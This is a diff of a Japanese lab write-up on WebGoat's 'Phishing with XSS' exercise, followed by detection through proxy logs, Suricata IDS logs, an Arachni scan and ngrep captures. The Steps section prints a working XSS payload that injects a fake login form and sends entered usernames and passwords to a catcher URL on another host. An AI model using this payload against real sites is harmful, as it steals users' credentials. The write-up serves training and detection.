@@ -59,30 +59,32 @@ ie) http://target.server/searchform?Input=test&SUBMIT=Search
 
 ### Steps
 1. ｢Phishing with XSS｣ページを開き、｢Search｣フィルドに作成した｢有害スクリプトを含む認証ページ｣を入力し、「Search｣ボタンをクリックする。   
-  
+
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/step1.png" title="Step 1">   
-  
+
 2. 表示された｢認証ページ｣にユーザIDとパスワードを入力し、送信する。   
 ex)
 ```
 </form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://192.168.33.10/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + ""; alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
 ```   
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/step2.png" width="270" height="240" title="Step 2">   
-  
+
 3. 入力した｢ユーザIDとパスワード｣がポップアップされることを確認する。    
 
 ### proxyサーバログの検知
 vagrant@www:~/apps$ sudo docker-compose logs | grep proxy > proxy.log<br>
-[18/Jan/2018:13:02:12 +0000] "GET /WebGoat/catcher?PROPERTY=yes&<span style="color:OrangeRed">user=test</span>&<span style="color:OrangeRed">password=test</span> HTTP/1.1" 200 0 "http://webgoat.cyexc-target/WebGoat/start.mvc" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"<br>
+[18/Jan/2018:13:02:12 +0000] **"GET /WebGoat/catcher?PROPERTY=yes&<span style="color:OrangeRed">user=test</span>&<span style="color:OrangeRed">password=test</span>** HTTP/1.1" 200 0 "http://webgoat.cyexc-target/WebGoat/start.mvc" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"<br>
 
 http&#58;//webgoat.cyexc-target/WebGoat/start.mvc <span></span>へのGETリクエストでuserとpasswordの値が漏れていることがわかる。<br>
+
 取得したログはこちら＠[proxy.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/proxy.log)<br>
 
 ### IDSログの検知
 vagrant@www:~/apps$ cp /var/log/suricata/http.log .<br>
-01/18/18-13:02:12.886696 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0 HTTP/1.1 GET webgoat.cyexc-target /WebGoat/catcher?PROPERTY=yes&<span style="color:OrangeRed">user=test</span>&<span style="color:OrangeRed">password=test</span> 200 0 192.168.33.1:58713 -> <span style="color:Green">192.168.33.10:80</span> (proxyサーバ)<br>
+01/18/18-13:02:12.886696 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0 HTTP/1.1 **GET webgoat.cyexc-target /WebGoat/catcher?PROPERTY=yes&<span style="color:OrangeRed">user=test</span>&<span style="color:OrangeRed">password=test</span>** 200 0 192.168.33.1:58713 -> <span style="color:Green">192.168.33.10:80</span> (proxyサーバ)<br>
 
 IDSのhttpログからも、http&#58;//webgoat.cyexc-target/WebGoat/start.mvc <span></span>でuserとpasswordの情報が漏れていることがわかる。<br>
+
 取得したログはこちら＠[http.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/http.log)<br>
 
 ### WEBスキャナー（Arachni）の実施
@@ -91,25 +93,33 @@ IDSのhttpログからも、http&#58;//webgoat.cyexc-target/WebGoat/start.mvc <s
 
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/scan.png" title="Archniスキャン">  
 
-http&#58;//webgoat.cyexc-target/WebGoat/start.mvc <span></span>に対して、*Unencrypted password form*や*Clickjacking*を検出している。<br>
-取得したログはこちら＠[index.html](http://htmlpreview.github.com/?https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/arachni/index.html) 
+http&#58;//webgoat.cyexc-target/WebGoat/start.mvc <span></span>に対して**Unencrypted password form**や**Clickjacking**を検出している。<br>
+
+取得したログはこちら＠[index.html](http://htmlpreview.github.com/?https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/arachni/index.html)
 
 ### proxyサーバでHTTP通信をキャプチャ
 実際にどのようなことが起きているのかは、WEBサーバのログを取得しないとわからない。
-
-1. proxyサーバにログイン  <br>
-vagrant@webgoat:~/apps$ sudo docker-compose exec proxy bash <br>
-2. ngrepを使用してHTTP通信をキャプチャ <br>
-root@c56fe08a3ea2:/# ngrep -W byline 'HTTP' -q > ngrep.log <br>
-3. proxyサーバをログアウト <br>
-4. ゲストOSでproxyサーバのcontainer IDを調べる <br>
-vagrant@webgoat:~/apps$ sudo docker ps <br>
-CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                    NAMES <br>
-937fb140f393        myproxy               "nginx -g 'daemon of…"   6 minutes ago       Up 6 minutes        0.0.0.0:80->80/tcp       apps_proxy_1 <br>
-64742ebbea0f        myarachni             "bin/arachni_web --h…"   6 minutes ago       Up 6 minutes        0.0.0.0:9292->9292/tcp   apps_arachni_1 <br>
-425df1dc54ac        webgoat/webgoat-7.1   "java -Djava.securit…"   6 minutes ago       Up 6 minutes        0.0.0.0:8080->8080/tcp   apps_webgoat_1 <br>
-5. 取得したngrepのログをゲストOSにコピー <br>
-vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log . <br>
+1. proxyサーバにログイン
+```
+vagrant@webgoat:~/apps$ sudo docker-compose exec proxy bash
+```
+2. ngrepを使用してHTTP通信をキャプチャ
+```
+root@c56fe08a3ea2:/# ngrep -W byline 'HTTP' -q > ngrep.log
+```
+3. proxyサーバをログアウト
+4. ゲストOSでproxyサーバのcontainer IDを調べる
+```
+vagrant@webgoat:~/apps$ sudo docker ps
+CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                    NAMES
+937fb140f393        myproxy               "nginx -g 'daemon of…"   6 minutes ago       Up 6 minutes        0.0.0.0:80->80/tcp       apps_proxy_1
+64742ebbea0f        myarachni             "bin/arachni_web --h…"   6 minutes ago       Up 6 minutes        0.0.0.0:9292->9292/tcp   apps_arachni_1
+425df1dc54ac        webgoat/webgoat-7.1   "java -Djava.securit…"   6 minutes ago       Up 6 minutes        0.0.0.0:8080->8080/tcp   apps_webgoat_1
+```
+5. 取得したngrepのログをゲストOSにコピー  <br>
+```
+vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log .  
+```
 
 取得したログはこちら＠[ngrep.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/ngrep.log)
 
